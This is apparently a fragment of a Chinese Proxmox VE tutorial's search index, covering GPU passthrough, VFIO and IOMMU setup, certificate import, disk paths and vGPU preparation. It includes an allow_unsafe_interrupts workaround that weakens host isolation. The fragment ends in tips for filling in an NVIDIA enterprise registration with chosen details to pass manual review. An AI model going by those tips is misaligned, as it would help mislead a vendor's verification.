<p>\u200b\u5c06\u200b\u5e38\u89c1\u200b\u7684\u200b\u9a71\u52a8\u7a0b\u5e8f\u200b\u52a0\u5165\u200b\u9ed1\u540d\u5355\u200b\uff0c\u200b\u5373\u200b\u8ba9\u200b GPU \u200b\u76f8\u5173\u200b\u8bbe\u5907\u200b\u5728\u200b\u4e0b\u6b21\u200b\u7cfb\u7edf\u542f\u52a8\u200b\u4e4b\u540e\u200b\u4e0d\u200b\u4f7f\u7528\u200b\u8fd9\u4e9b\u200b\u9a71\u52a8\u200b\uff0c\u200b\u628a\u200b\u8bbe\u5907\u200b\u817e\u51fa\u6765\u200b\u7ed9\u200b vfio \u200b\u9a71\u52a8\u200b\u7528\u200b\uff1a</p> Bash<pre><code>echo \"blacklist nvidiafb\" &gt;&gt; /etc/modprobe.d/blacklist.conf\necho \"blacklist nouveau\" &gt;&gt; /etc/modprobe.d/blacklist.conf\necho \"blacklist nvidia\" &gt;&gt; /etc/modprobe.d/blacklist.conf\necho \"blacklist radeon\" &gt;&gt; /etc/modprobe.d/blacklist.conf\necho \"blacklist amdgpu\" &gt;&gt; /etc/modprobe.d/blacklist.conf\necho \"blacklist snd_hda_intel\" &gt;&gt; /etc/modprobe.d/blacklist.conf\necho \"blacklist snd_hda_codec_hdmi\" &gt;&gt; /etc/modprobe.d/blacklist.conf\necho \"blacklist i915\" &gt;&gt; /etc/modprobe.d/blacklist.conf\n</code></pre> <p>\u200b\u7136\u540e\u200b\u66f4\u65b0\u200b\u5185\u6838\u200b\u91cd\u542f\u200b\u673a\u5668\u200b\uff1a</p> Bash<pre><code>update-initramfs -u &amp;&amp; reboot\n</code></pre> <p>\u200b\u91cd\u542f\u200b\u540e\u200b\uff0c\u200b\u68c0\u67e5\u200b\u4e4b\u524d\u200b\u914d\u7f6e\u200b\u7684\u200b VFIO \u200b\u6a21\u5757\u200b\u662f\u5426\u200b\u6b63\u5e38\u200b\u52a0\u8f7d\u200b\uff1a</p> Bash<pre><code>lsmod |grep vfio\n</code></pre> <p>\u200b\u4e0b\u56fe\u200b\u8fd9\u6837\u200b\u8868\u793a\u200b\u662f\u200b\u6210\u529f\u200b\u52a0\u8f7d\u200b\u4e86\u200b\u7684\u200b\u3002</p> <p> </p>"},{"location":"4/2/#iommu_1","title":"IOMMU \u200b\u4e2d\u65ad\u200b\u91cd\u200b\u6620\u5c04","text":"<p>\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u4e2d\u65ad\u200b\u91cd\u65b0\u200b\u6620\u5c04\u200b\uff0c\u200b\u5c06\u200b\u65e0\u6cd5\u200b\u4f7f\u7528\u200b PCI \u200b\u76f4\u901a\u200b\u3002\u200b\u6240\u6709\u200b\u4f7f\u7528\u200b\u652f\u6301\u200b\u82f1\u7279\u5c14\u200b\u5b9a\u5411\u200b I/O \u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b (VT-d) \u200b\u4f46\u200b\u4e0d\u200b\u652f\u6301\u200b\u4e2d\u65ad\u200b\u91cd\u65b0\u200b\u6620\u5c04\u200b\u7684\u200b\u82f1\u7279\u5c14\u200b\u5904\u7406\u5668\u200b\u548c\u200b\u82af\u7247\u7ec4\u200b\u7684\u200b\u7cfb\u7edf\u200b\u90fd\u200b\u62a5\u9519\u200b\u3002\u200b\u8f83\u200b\u65b0\u200b\u7684\u200b\u5904\u7406\u5668\u200b\u548c\u200b\u82af\u7247\u7ec4\u200b\uff08AMD \u200b\u548c\u200b Intel\uff09\u200b\u90fd\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e2d\u65ad\u200b\u91cd\u65b0\u200b\u6620\u5c04\u200b\u652f\u6301\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u5982\u4e0b\u200b\u547d\u4ee4\u200b\u6765\u200b\u786e\u5b9a\u200b\u7cfb\u7edf\u200b\u662f\u5426\u200b\u652f\u6301\u200b\u4e2d\u65ad\u200b\u91cd\u200b\u6620\u5c04\u200b\uff1a</p> Bash<pre><code>dmesg | grep 'remapping'\n</code></pre> <p>\u200b\u5982\u679c\u200b\u770b\u5230\u200b\u7c7b\u4f3c\u200b\u4e0b\u9762\u200b\u7684\u200b\u5185\u5bb9\u200b\u4e4b\u4e00\u200b\uff1a</p> Text Only<pre><code>\"AMD-Vi: Interrupt remapping enabled\"\n\"DMAR-IR: Enabled IRQ remapping in x2apic mode\"\n</code></pre> <p>x2apic \u200b\u5728\u200b\u4e0d\u540c\u200b\u7684\u200b CPU \u200b\u4e0a\u200b\u53ef\u80fd\u200b\u53eb\u6cd5\u200b\u4e0d\u200b\u4e00\u6837\u200b\uff0c\u200b\u95ee\u9898\u200b\u4e0d\u200b\u5927\u200b\u3002</p> <p>\u200b\u53e6\u5916\u200b\u5982\u679c\u200b\u4f60\u200b\u7684\u200b CPU \u200b\u4e0d\u200b\u652f\u6301\u200b x2apic \u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ef\u80fd\u200b\u662f\u200b BIOS \u200b\u6ca1\u6709\u200b\u5f00\u542f\u200b\uff0c\u200b\u6211\u200b\u7684\u200b\u534e\u5357\u200b X99 \u200b\u662f\u200b\u9700\u8981\u200b\u624b\u52a8\u200b\u5728\u200b BIOS \u200b\u91cc\u9762\u200b\u5f00\u542f\u200b\u7684\u200b\uff1a\u200b\u5728\u200b \u3010InterRCSetup\u3011 - \u3010Processor Configuration\u3011 \u200b\u91cc\u9762\u200b\u53ef\u4ee5\u200b\u6253\u5f00\u200b X2APIC \u200b\u9009\u9879\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u6211\u4eec\u200b\u7684\u200b IOMMU \u200b\u662f\u200b\u652f\u6301\u200b\u4e2d\u65ad\u200b\u6620\u5c04\u200b\u7684\u200b\uff1a</p> <p> </p> <p>\u200b\u5982\u679c\u200b\u5f88\u200b\u4e0d\u5de7\u200b\uff0c\u200b\u4f60\u200b\u7684\u200b\u7535\u8111\u200b\u771f\u7684\u200b\u4e0d\u200b\u652f\u6301\u200b IOMMU \u200b\u4e2d\u65ad\u200b\u91cd\u200b\u6620\u5c04\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4e0b\u9762\u200b\u7684\u200b\u547d\u4ee4\u200b\u4fee\u8865\u200b\u4e00\u4e0b\u200b\uff1a</p> Bash<pre><code>echo \"options vfio_iommu_type1 allow_unsafe_interrupts=1\" &gt; /etc/modprobe.d/iommu_unsafe_interrupts.conf\n</code></pre>"},{"location":"4/2/#ovmf","title":"OVMF \u200b\u4e0b\u200b\u663e\u5361\u200b\u76f4\u901a","text":"<p>\u200b\u865a\u62df\u673a\u200b\u7684\u200b BIOS \u200b\u63a8\u8350\u200b\u4e3a\u200b OVMF \u200b\u66ff\u4ee3\u200b\u9ed8\u8ba4\u200b\u7684\u200b SeaBIOS\u3002\u200b\u4e0d\u8fc7\u200b OVMF \u200b\u8d70\u200b\u7684\u200b UEFI \u200b\u53ea\u200b\u652f\u6301\u200b\u9ad8\u200b\u7248\u672c\u200b\u7684\u200b Windows \uff08win &gt;=8\uff09,\u200b\u53e6\u5916\u200b\u673a\u578b\u200b\u63a8\u8350\u200b\u4e3a\u200b\uff1aq35</p> <p>\u200b\u9996\u5148\u200b\u67e5\u627e\u200b\u663e\u5361\u200b\u76f8\u5173\u200b\u7684\u200b ID\uff1a</p> Bash<pre><code>lspci -nn | grep -E \"Display|VGA|Audio|AMD|NVIDIA\"\n</code></pre> <p> </p> <p>\u200b\u9664\u4e86\u200b\u7b2c\u200b 1 \u200b\u4e2a\u200b\u662f\u200b\u4e3b\u677f\u200b\u81ea\u5e26\u200b\u7684\u200b\u58f0\u5361\u200b\u4ee5\u5916\u200b\uff0c\u200b\u4e0b\u9762\u200b\u8fd9\u200b 7 \u200b\u4e2a\u200b ID\u200b\u5c31\u662f\u200b\u6211\u200b\u663e\u5361\u200b\u76f8\u5173\u200b\u7684\u200b ID \u200b\u4e86\u200b\uff08\u200b\u591a\u4e2a\u200b ID \u200b\u4f7f\u7528\u200b\u9017\u53f7\u200b\u9694\u5f00\u200b\uff09\uff1a</p> INI<pre><code>10de:0fc2,10de:0e1b,10de:1bb3,10de:2487,10de:228b,1002:67df,1002:aaf0\n</code></pre> <p>\u200b\u5c06\u200b\u4e0a\u9762\u200b\u67e5\u627e\u200b\u7684\u200b ID \u200b\u6570\u636e\u200b\u5e26\u5165\u200b\u5230\u200b\u4e0b\u9762\u200b\u7684\u200b ids \u200b\u540e\u9762\u200b\uff0c\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b OVMF \u200b\u7684\u8bdd\u200b\uff0c\u200b\u8fd8\u200b\u5efa\u8bae\u200b\u5c06\u200b disable_vga=1 \u200b\u6dfb\u52a0\u200b\u5230\u200b vfio-pci \u200b\u6a21\u5757\u200b\uff1a</p> Bash<pre><code>echo \"options vfio-pci ids=10de:0fc2,10de:0e1b,10de:1bb3,10de:2487,10de:228b,1002:67df,1002:aaf0 disable_vga=1\" &gt; /etc/modprobe.d/vfio.conf\n</code></pre> <p>\u200b\u91cd\u542f\u200b\u4e4b\u540e\u200b\u5373\u53ef\u200b\u76f4\u63a5\u200b\u76f4\u901a\u200b\u663e\u5361\u200b\u548c\u200b\u5404\u79cd\u200b PCIe \u200b\u8bbe\u5907\u200b\u4e86\u200b\uff0c\u200b\u53e6\u5916\u200b\u8fd8\u6709\u200b\u63d0\u9192\u200b\u4e00\u4e0b\u200b\uff0c OVMF \u200b\u6a21\u5f0f\u200b\u4e0b\u200b\u76f4\u901a\u200b GPU \u200b\u7684\u8bdd\u200b\uff0c\u200b\u6709\u4e9b\u200b\u5361\u200b\u8fd8\u200b\u9700\u8981\u200b romfile \u200b\u53c2\u6570\u200b\u6765\u200b\u6307\u5b9a\u200b\u663e\u5361\u200b\u539f\u672c\u200b\u7684\u200b  ROM (bios)\u200b\u6587\u4ef6\u200b\u624d\u200b\u53ef\u4ee5\u200b\uff1a</p> INI<pre><code>hostpci0: 01:00,x-vga=on,romfile=vbios.rom\n</code></pre> \u200b\u63d0\u53d6\u200b\u663e\u5361\u200b\u7684\u200b\u539f\u59cb\u200b ROM  <ol> <li>\u200b\u901a\u7528\u200b\u65b9\u6cd5\u200b\uff1aWindows \u200b\u4e0b\u200b\u4f7f\u7528\u200b GPU-Z \u200b\u6765\u200b\u4fdd\u5b58\u200b\u663e\u5361\u200b\u7684\u200b ROM \u200b\u6587\u4ef6\u200b</li> <li>\u200b\u4e0b\u8f7d\u200b\u7f51\u4e0a\u200b\u7684\u200b ROM \u200b\u6587\u4ef6\u200b, ROM \u200b\u5206\u4eab\u200b\u4e0b\u8f7d\u200b\u7f51\u7ad9\u200b\uff1ahttps://www.techpowerup.com/vgabios/</li> </ol> <p>\u200b\u90e8\u5206\u200b\u663e\u5361\u200b\u4e0d\u200b\u9700\u8981\u200b romfile \u200b\u53c2\u6570\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u901a\u200b</p> <ol> <li>AMD RX400\u3001RX500 \u200b\u7cfb\u5217\u200b\u6d4b\u8bd5\u200b\u65e0\u9700\u200b romfile \u200b\u53c2\u6570\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u901a\u200b</li> <li>AMD RX5000\u3001RX6000 \u200b\u7cfb\u5217\u200b\u5927\u591a\u6570\u200b\u9700\u8981\u200b romfile \u200b\u53c2\u6570\u200b\u624d\u200b\u53ef\u4ee5\u200b\u987a\u5229\u200b\u76f4\u901a\u200b</li> </ol>"},{"location":"4/2/#_3","title":"\u9632\u6b62\u200b\u865a\u62df\u673a\u200b\u5d29\u6e83","text":"<p>\u200b\u67d0\u4e9b\u200b Windows \u200b\u5e94\u7528\u7a0b\u5e8f\u200b\uff08\u200b\u5982\u200b Geforce Experience\u3001Passmark Performance Test \u200b\u548c\u200b SiSoftware Sandra crash\uff09\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u4f7f\u200b\u865a\u62df\u673a\u200b\u5d29\u6e83\u200b\u3002\u200b\u4ee5\u53ca\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u5728\u200bPVE \u200b\u4e0b\u200b macOS \u200b\u9ed1\u200b\u82f9\u679c\u200b\u5f15\u5bfc\u200b\u671f\u95f4\u200b\u51fa\u73b0\u200b\u5f15\u5bfc\u200b\u5faa\u73af\u200b\u6b7b\u673a\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u6dfb\u52a0\u200b\uff1a</p> Bash<pre><code>echo \"options kvm ignore_msrs=1 report_ignored_msrs=0\" &gt; /etc/modprobe.d/kvm.conf &amp;&amp; update-initramfs -k all -u &amp;&amp; reboot\n</code></pre> <p>\u200b\u5176\u4e2d\u200b report_ignored_msrs=0 \u200b\u662f\u200b\u4e3a\u4e86\u200b\u9632\u6b62\u200b\u63a7\u5236\u53f0\u200b\u5237\u5c4f\u200b\u770b\u5230\u200b\u5f88\u591a\u5f88\u591a\u200b\u8b66\u544a\u200b\u6d88\u606f\u200b\u7528\u200b\u7684\u200b\uff0c\u200b\u4fee\u6539\u200b\u5b8c\u6210\u200b\u91cd\u542f\u200b PVE \u200b\u5373\u53ef\u200b\u3002</p>"},{"location":"4/3/","title":"\u914d\u7f6e\u200b\u8bc1\u4e66","text":"<p>PVE \u200b\u81ea\u5e26\u200b\u7684\u200b\u8bc1\u4e66\u200b\u662f\u200b\u65e0\u6548\u200b\u7684\u200b\uff0c\u200b\u8fd9\u200b\u600e\u4e48\u200b\u80fd\u5fcd\u200b\uff1f\uff1a</p> <p> </p>"},{"location":"4/3/#_1","title":"\u57df\u540d\u89e3\u6790","text":"<p>\u200b\u914d\u7f6e\u200b 1 \u200b\u4e2a\u200b  A \u200b\u8bb0\u5f55\u200b\u7684\u200b\u5b50\u200b\u57df\u540d\u89e3\u6790\u200b\u5230\u200b 192.168.1.10\uff08PVE \u200b\u7684\u200b\u63a7\u5236\u53f0\u200b IP\uff09\uff1a</p> <p> </p> <p>\u200b\u914d\u7f6e\u200b\u597d\u200b\u89e3\u6790\u200b\u540e\u200b\uff0c\u200b\u5341\u51e0\u5206\u949f\u200b\u540e\u200b\u6d4b\u8bd5\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u786e\u4fdd\u200b\u5168\u56fd\u200b\u5404\u5730\u200b\u89e3\u6790\u200b\u90fd\u200b\u6ca1\u200b\u95ee\u9898\u200b\uff1a</p> <p> </p>"},{"location":"4/3/#_2","title":"\u7b7e\u53d1\u200b\u8bc1\u4e66","text":"<p>\u200b\u4f7f\u7528\u200b\u4e91\u200b\u670d\u52a1\u5668\u200b\u5382\u5546\u200b\u63d0\u4f9b\u200b\u670d\u52a1\u200b\u7b7e\u53d1\u200b1\u200b\u4e2a\u200b\u514d\u8d39\u200b\u7684\u200b\u8bc1\u4e66\u200b\uff0c\u200b\u56fd\u5149\u200b\u6211\u200b\u8fd9\u91cc\u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b\u963f\u91cc\u200b\u4e91\u200b\u7684\u200b DigiCert \u200b\u514d\u8d39\u7248\u200b SSL\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u4e0b\u8f7d\u200b\u7c7b\u578b\u200b\u4e3a\u200b\uff1a\u300c\u200b\u5176\u4ed6\u200b\u300d\u200b\u7559\u7740\u200b\u5907\u7528\u200b</p>"},{"location":"4/3/#_3","title":"\u5bfc\u5165\u200b\u8bc1\u4e66","text":"<p>\u200b\u5728\u200b PVE \u200b\u7684\u200b Web UI \u200b\u63a7\u5236\u53f0\u200b\u4e2d\u200b\uff0c\u200b\u627e\u5230\u200b\u8282\u70b9\u200b - \u300c\u200b\u7cfb\u7edf\u200b\u300d-\u300c\u200b\u51ed\u8bc1\u200b\u300d\u200b\u5bfc\u5165\u200b\u6211\u4eec\u200b\u4e0a\u9762\u200b\u4e0b\u8f7d\u200b\u597d\u200b\u7684\u200b\u8bc1\u4e66\u200b\uff1a</p> <p> </p> <p>\u200b\u5bfc\u5165\u200b\u5b8c\u6210\u200b\u540e\u200b\uff0c\u200b\u8f93\u5165\u200b xeon.sqlsec.com \u200b\u8fd9\u4e2a\u200b\u57df\u540d\u200b\u91cd\u65b0\u200b\u8f7d\u5165\u200b Web UI \u200b\u63a7\u5236\u53f0\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u5df2\u7ecf\u200b\u6ca1\u6709\u200b\u4e0d\u200b\u5b89\u5168\u200b\u7684\u200b\u63d0\u793a\u200b\u4e86\u200b\uff1a</p> <p> </p>"},{"location":"4/4/","title":"\u786c\u76d8\u200b\u8fc1\u79fb","text":""},{"location":"4/4/#_1","title":"\u9700\u6c42\u200b\u573a\u666f","text":"<p>local-vm \u200b\u8981\u200b\u6ee1\u200b\u4e86\u200b\uff0c\u200b\u60f3\u200b\u8fc1\u79fb\u200b VM \u200b\u78c1\u76d8\u200b\u5230\u200b\u5176\u4ed6\u200b\u786c\u76d8\u200b\u91cc\u9762\u200b\u53bb\u200b\uff1a</p> <p> </p>"},{"location":"4/4/#_2","title":"\u5b9a\u4f4d\u200b\u8def\u5f84","text":"Bash<pre><code>\u279c cat /etc/pve/qemu-server/103.conf |grep sata\nboot: order=sata0\nsata0: local-lvm:vm-103-disk-1,backup=0,cache=unsafe,discard=on,size=320G,ssd=1\n</code></pre> <p>\u200b\u62ff\u5230\u200b\u5f53\u524d\u200b\u7684\u200b\u786c\u76d8\u200b\u4fe1\u606f\u200b\u4e3a\u200b\uff1alocal-lvm:vm-103-disk-1</p> <p>\u200b\u7ee7\u7eed\u200b\u4f7f\u7528\u200b\u547d\u4ee4\u200b<code>pvesm path</code> \u200b\u6765\u200b\u5b9a\u4f4d\u200b\u5177\u4f53\u200b\u7684\u200b\u5b58\u653e\u200b\u8def\u5f84\u200b\uff1a</p> Bash<pre><code>\u279c pvesm path local-lvm:vm-103-disk-1\n/dev/pve/vm-103-disk-1\n</code></pre>"},{"location":"4/5/","title":"vGPU\u200b\u6559\u7a0b","text":""},{"location":"4/5/#_1","title":"\u51c6\u5907\u200b\u5de5\u4f5c","text":"<p>\u200b\u5176\u5b9e\u200b\u8fd9\u90e8\u5206\u200b\u4e3b\u8981\u200b\u53c2\u8003\u200b\u524d\u9762\u200b\u7684\u200b\u4e24\u4e2a\u200b\u7ae0\u8282\u200b\u7684\u200b\u914d\u7f6e\u200b\u5b8c\u5168\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e86\u200b\uff1a</p> <ul> <li>BIOS\u200b\u8bbe\u7f6e\u200b - \u200b\u56fd\u5149\u200b\u7684\u200b PVE &amp; Linux \u200b\u751f\u4ea7\u529b\u200b\u73af\u5883\u200b\u642d\u5efa\u200b\u6559\u7a0b\u200b</li> <li>\u200b\u786c\u4ef6\u200b\u76f4\u901a\u200b - \u200b\u56fd\u5149\u200b\u7684\u200b PVE &amp; Linux \u200b\u751f\u4ea7\u529b\u200b\u73af\u5883\u200b\u642d\u5efa\u200b\u6559\u7a0b\u200b</li> </ul> <p>\u200b\u4e0b\u9762\u200b\u9ed8\u8ba4\u200b\u5927\u5bb6\u200b\u662f\u200b\u770b\u8fc7\u200b\u5e76\u200b\u914d\u7f6e\u200b\u8fc7\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u7ae0\u8282\u200b\u5185\u5bb9\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5c31\u200b\u4e0d\u200b\u8be6\u7ec6\u200b\u89e3\u91ca\u200b\u4e86\u200b\u3002</p>"},{"location":"4/5/#bios","title":"BIOS \u200b\u8bbe\u7f6e","text":"<ul> <li> \u200b\u5f00\u542f\u200b Intel VMX \u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\uff08PCIe \u200b\u4ef6\u200b\u76f4\u901a\u200b\u5fc5\u987b\u200b\uff09</li> <li> \u200b\u5f00\u542f\u200b VT-d \uff08PCIe \u200b\u4ef6\u200b\u76f4\u901a\u200b\u5fc5\u987b\u200b\uff09</li> <li> \u200b\u5f00\u542f\u200b SR-IOV \u200b\u7f51\u5361\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b \uff08\u200b\u9ad8\u6548\u200b\u5148\u8fdb\u200b\u7684\u200b\u865a\u62df\u673a\u200b\u7f51\u5361\u200b\u6280\u672f\u200b\uff09</li> <li> \u200b\u5f00\u542f\u200b Above 4G  Decoding\uff08vGPU \u200b\u65b9\u6848\u200b\u9700\u8981\u200b\u5f00\u542f\u200b\u8fd9\u4e2a\u200b\u9009\u9879\u200b\uff09</li> <li> \u200b\u5f00\u542f\u200b Numa \uff08\u200b\u591a\u8def\u200b CPU \u200b\u5efa\u8bae\u200b\u5f00\u542f\u200b\uff0c\u200b\u63d0\u9ad8\u200b\u591a\u8def\u200b CPU \u200b\u8fd0\u884c\u200b\u6548\u7387\u200b\uff0c\u200b\u5408\u7406\u200b\u5206\u914d\u200b\u8d1f\u8f7d\u200b\uff09</li> <li> \u200b\u5f00\u542f\u200b x2APIC\uff08PCIe \u200b\u786c\u4ef6\u200b\u76f4\u901a\u200b\u9700\u8981\u200b\uff09</li> </ul>"},{"location":"4/5/#_2","title":"\u4f9d\u8d56\u200b\u5305\u200b\u5b89\u88c5","text":"<p>\u200b\u9996\u5148\u200b\u5c06\u200b\u53ef\u4ee5\u200b\u5347\u7ea7\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u5347\u7ea7\u200b\u5230\u200b\u6700\u65b0\u200b\u7248\u672c\u200b\uff1a</p> Bash<pre><code>apt update\napt dist-upgrade\n</code></pre> <p>\u200b\u7136\u540e\u200b\u5b89\u88c5\u200b\u76f8\u5173\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5305\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5347\u7ea7\u200b\u6700\u65b0\u200b\u7684\u200b PVE Linux \u200b\u5185\u6838\u200b\uff1a</p> Bash<pre><code>apt install -y build-essential dkms pve-headers mdevctl\n</code></pre>"},{"location":"4/5/#_3","title":"\u914d\u7f6e\u200b\u5185\u6838","text":"<p>\u200b\u6211\u4eec\u200b\u5fc5\u987b\u200b\u52a0\u8f7d\u200b\u5185\u6838\u6a21\u5757\u200b\u624d\u80fd\u200b\u4f7f\u200b vGPU \u200b\u5de5\u4f5c\u200b\uff1a</p> Bash<pre><code>echo vfio &gt;&gt; /etc/modules \necho vfio_iommu_type1 &gt;&gt; /etc/modules \necho vfio_pci &gt;&gt; /etc/modules \necho vfio_virqfd &gt;&gt; /etc/modules\n</code></pre> <p>\u200b\u963b\u6b62\u200b Proxmox \u200b\u81ea\u5e26\u200b\u7684\u200b Nvidia GPU \u200b\u7684\u200b\u5f00\u6e90\u200b\u65b0\u200b\u9a71\u52a8\u7a0b\u5e8f\u200b\uff1a</p> Bash<pre><code>echo \"blacklist nvidiafb\" &gt;&gt; /etc/modprobe.d/blacklist.conf\necho \"blacklist nouveau\" &gt;&gt; /etc/modprobe.d/blacklist.conf\necho \"blacklist nvidia\" &gt;&gt; /etc/modprobe.d/blacklist.conf\necho \"blacklist radeon\" &gt;&gt; /etc/modprobe.d/blacklist.conf\necho \"blacklist amdgpu\" &gt;&gt; /etc/modprobe.d/blacklist.conf\necho \"blacklist snd_hda_intel\" &gt;&gt; /etc/modprobe.d/blacklist.conf\necho \"blacklist snd_hda_codec_hdmi\" &gt;&gt; /etc/modprobe.d/blacklist.conf\necho \"blacklist i915\" &gt;&gt; /etc/modprobe.d/blacklist.conf\n</code></pre> <p>\u200b\u5e94\u7528\u200b\u6211\u4eec\u200b\u7684\u200b\u5185\u6838\u200b\u914d\u7f6e\u200b\u5e76\u200b\u91cd\u542f\u200b:</p> Bash<pre><code>update-initramfs -u -k all &amp;&amp; reboot\n</code></pre>"},{"location":"4/5/#_4","title":"\u9a71\u52a8\u200b\u5b89\u88c5","text":"<p>\u200b\u9996\u5148\u200b\u9700\u8981\u200b PVE \u200b\u5bbf\u4e3b\u673a\u200b\u5b89\u88c5\u200b NVIDIA \u200b\u7684\u200b\u9a71\u52a8\u200b\uff0c\u200b\u4f46\u662f\u200b N \u200b\u5361\u200b\u7684\u200b\u8ba1\u7b97\u200b\u5361\u200b\u53ea\u200b\u9488\u5bf9\u200b\u4f01\u4e1a\u200b\u5546\u4e1a\u200b\u7528\u6237\u200b\u5e76\u200b\u4e0d\u200b\u5f00\u653e\u200b\u7ed9\u200b\u666e\u901a\u200b\u4e2a\u4eba\u7528\u6237\u200b\u4e0b\u8f7d\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u5f97\u200b\u6ce8\u518c\u200b NVIDIA \u200b\u7684\u200b\u4f01\u4e1a\u200b\u8d26\u53f7\u200b\u767b\u5f55\u200b\u624d\u200b\u53ef\u4ee5\u200b\u4e0b\u8f7d\u200b\uff0c\u200b\u5177\u4f53\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b NVIDIA \u200b\u5b98\u7f51\u200b\u6587\u6863\u200b\uff1a</p> <p>Quick Start Guide :: NVIDIA Virtual GPU Software Documentation </p> <p>\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u5b98\u65b9\u200b\u6587\u6863\u200b\u5199\u200b\u7684\u200b\u6bd4\u8f83\u200b\u86cb\u75bc\u200b\uff0c\u200b\u56fd\u5185\u200b\u7684\u200b\u7528\u6237\u200b\u5927\u5bb6\u200b\u76f4\u63a5\u200b\u770b\u200b\u6211\u200b\u4e0b\u9762\u200b\u7684\u200b\u7ec6\u8282\u200b\u64cd\u4f5c\u200b\u5c31\u884c\u4e86\u200b\u3002</p>"},{"location":"4/5/#_5","title":"\u4f01\u4e1a\u200b\u8d26\u53f7","text":"<p>\u200b\u6ce8\u518c\u200b\u7684\u200b\u65f6\u5019\u200b\u5c3d\u91cf\u200b\u4e0d\u8981\u200b\u4f7f\u7528\u200b gmail.com \u200b\u6216\u8005\u200b qq.com \u200b\u7b49\u200b\u901a\u7528\u200b\u4e2a\u4eba\u200b\u90ae\u7bb1\u200b\u670d\u52a1\u200b\uff0c\u200b\u4eba\u5de5\u200b\u5ba1\u6838\u200b\u5927\u200b\u6982\u7387\u200b\u4e0d\u200b\u901a\u8fc7\u200b\u3002\u200b\u56fd\u5149\u200b\u5efa\u8bae\u200b\u5927\u5bb6\u200b\u8003\u8651\u200b\u4f7f\u7528\u200b\u57df\u540d\u200b\u90ae\u7bb1\u200b\u6216\u8005\u200b\u5176\u4ed6\u200b\u4f01\u4e1a\u200b\u7684\u200b\u90ae\u7bb1\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u6211\u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b\u81ea\u5df1\u200b\u7f51\u7ad9\u200b\u7684\u200b\u57df\u540d\u200b\u90ae\u7bb1\u200b\uff1a admin@sqlsec.com\uff0c\u200b\u603b\u7684\u6765\u8bf4\u200b\u56fd\u5185\u200b\u7533\u8bf7\u200b\u6ce8\u518c\u200b NVIDIA \u200b\u4f01\u4e1a\u200b\u8d26\u6237\u200b\u8fd8\u662f\u200b\u6bd4\u8f83\u200b\u7e41\u7410\u200b\u7684\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u662f\u200b\u56fd\u5149\u200b\u6211\u200b\u6ce8\u518c\u200b\u7684\u200b\u65f6\u5019\u200b\u586b\u5199\u200b\u7684\u200b\u5927\u6982\u200b\u4fe1\u606f\u200b\uff1a</p> <p> </p> <p>\u200b\u4e3b\u8981\u200b\u8bb0\u4f4f\u200b\u5982\u4e0b\u200b\u4e00\u4e9b\u200b\u70b9\u200b\uff1a</p> <ol> <li>\u200b\u9009\u62e9\u200b\u53f0\u6e7e\u5730\u533a\u200b\uff0c\u200b\u56fd\u5149\u200b\u8ba4\u4e3a\u200b\u8fd9\u662f\u200b NVIDIA \u200b\u7684\u200b\u8001\u5bb6\u200b\uff0c\u200b\u6210\u529f\u7387\u200b\u5e94\u8be5\u200b\u9ad8\u200b\u4e00\u70b9\u200b</li> <li>\u200b\u9009\u62e9\u200b IT Service \u200b\u4fe1\u606f\u200b\u670d\u52a1\u884c\u4e1a\u200b</li> <li>\u200b\u804c\u4f4d\u200b\u9009\u62e9\u200b\uff1a\u200b\u5b66\u751f\u200b\uff0c\u200b\u6bd5\u7adf\u200b\u6211\u200b\u662f\u200b\u5b66\u751f\u200b\u8bb0\u5f97\u200b\u591a\u585e\u200b 200 \u200b\u5757\u94b1\u200b\u7684\u200b\u6897\u200b\uff0c\u200b\u5168\u4e16\u754c\u200b\u57fa\u672c\u4e0a\u200b\u5982\u6b64\u200b</li> <li>\u200b\u670d\u52a1\u5668\u200b\u9009\u62e9\u200b\u56fd\u5185\u200b\u7684\u200b\uff1aLenovo\u3001VDI \u200b\u9009\u62e9\u200b RedHat \u200b\u865a\u62df\u5316\u200b\uff0c\u200b\u8bb0\u5f97\u200b\u89c4\u6a21\u200b\u9009\u62e9\u200b 1-99 \u200b\u8d8a\u5c0f\u8d8a\u200b\u597d\u200b\uff0c\u200b\u5927\u89c4\u6a21\u200b\u53ef\u80fd\u200b\u771f\u7684\u200b\u4f1a\u200b\u88ab\u200b\u7535\u8bdd\u200b\u6838\u5b9e\u200b</li> 